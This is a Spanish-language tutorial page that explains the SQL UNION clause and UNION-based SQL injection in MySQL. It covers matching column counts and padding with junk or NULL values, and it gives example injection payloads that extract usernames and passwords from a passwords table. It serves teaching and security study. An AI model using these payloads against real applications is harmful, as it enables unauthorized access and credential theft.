# Clausula union

### Unión

La cláusula `UNION` (https://dev.mysql.com/doc/refman/8.0/en/union.html) se utiliza para combinar resultados de múltiples sentencias `SELECT`. Esto significa que, a través de una inyección `UNION`, podremos `SELECT` y volcar datos de varios DBMS, desde múltiples tablas y bases de datos. Intentemos utilizar el operador `UNION` en una base de datos de muestra. Primero, veamos el contenido de la tabla `ports`:

{% code title="mysql (consulta)" %}
```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```
{% endcode %}

A continuación, veamos el resultado de la tabla `ships`:

{% code title="mysql (consulta)" %}
```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```
{% endcode %}

Ahora, intentemos usar `UNION` para combinar ambos resultados:

{% code title="mysql (consulta)" %}
```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```
{% endcode %}

Como podemos ver, `UNION` combinó la salida de ambas sentencias `SELECT` en una, por lo que las entradas de las tablas `ports` y `ships` se combinaron en una única salida con cuatro filas. Algunas filas pertenecen a `ports` y otras a `ships`.

{% hint style="info" %}
Nota: Los tipos de datos de las columnas seleccionadas en todas las posiciones deben ser compatibles.
{% endhint %}

### Columnas pares

Una declaración `UNION` solo puede operar sobre sentencias `SELECT` con el mismo número de columnas. Por ejemplo, si intentamos hacer `UNION` entre dos consultas que devuelven distinto número de columnas, obtenemos un error:

{% code title="mysql (error)" %}
```shell-session
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```
{% endcode %}

La consulta anterior da error porque el primer `SELECT` devuelve una columna y el segundo `SELECT` devuelve dos. Una vez que tengamos dos consultas que devuelvan el mismo número de columnas, podemos usar el operador `UNION` para extraer datos de otras tablas y bases de datos.

Por ejemplo, si la consulta original es:

{% code title="consulta original" %}
```sql
SELECT * FROM products WHERE product_id = 'user_input'
```
{% endcode %}

Podemos inyectar una consulta `UNION` en la entrada, de modo que se devuelvan filas de otra tabla:

{% code title="inyección UNION (ejemplo)" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
{% endcode %}

La consulta anterior devolvería `username` y `password` de la tabla `passwords`, suponiendo que la tabla `products` tiene dos columnas.

### Columnas desiguales

Descubriremos que la consulta original normalmente no tendrá la misma cantidad de columnas que la consulta SQL que queremos ejecutar, por lo que tendremos que solucionarlo. Por ejemplo, si la consulta original devuelve solo una columna pero queremos `SELECT` una columna desde otra tabla, podemos rellenar las columnas restantes con datos “basura” para que el número total de columnas del `UNION` coincida.

Podemos usar cualquier cadena como datos basura y la consulta devolverá esa cadena para esa columna. Por ejemplo, `SELECT 'junk' FROM passwords` devolverá siempre `junk`. También podemos utilizar números: `SELECT 1 FROM passwords` siempre regresará `1`.

{% hint style="info" %}
Nota: Al llenar otras columnas con datos basura, debemos asegurarnos de que el tipo de datos coincida con el tipo de datos esperado; de lo contrario, la consulta devolverá un error. Para simplificar, utilizaremos números como datos basura, ya que también ayudan a rastrear las posiciones de nuestras cargas útiles.
{% endhint %}

Consejo: Para inyección SQL avanzada, a menudo es conveniente usar `NULL` para completar otras columnas, ya que `NULL` suele ser compatible con todos los tipos de datos.

En el ejemplo anterior, la tabla `products` tiene dos columnas, por lo que tenemos que `UNION` con dos columnas. Si solo queremos obtener una columna, por ejemplo `username`, debemos incluir un dato adicional para completar la segunda columna, por ejemplo `2`, de modo que tengamos el mismo número de columnas:

{% code title="ejemplo: rellenar columna" %}
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
{% endcode %}

Si la consulta original tiene más columnas, agregaremos más valores de relleno. Por ejemplo, si la consulta original `SELECT` opera sobre una tabla de cuatro columnas, nuestra inyección `UNION` sería:

{% code title="ejemplo: cuatro columnas" %}
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
{% endcode %}

El resultado sería algo como:

{% code title="mysql (resultado)" %}
```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```
{% endcode %}

Como vemos, el resultado deseado de `UNION SELECT username from passwords` aparece en la primera columna de la segunda fila, mientras que los números llenan las columnas restantes.
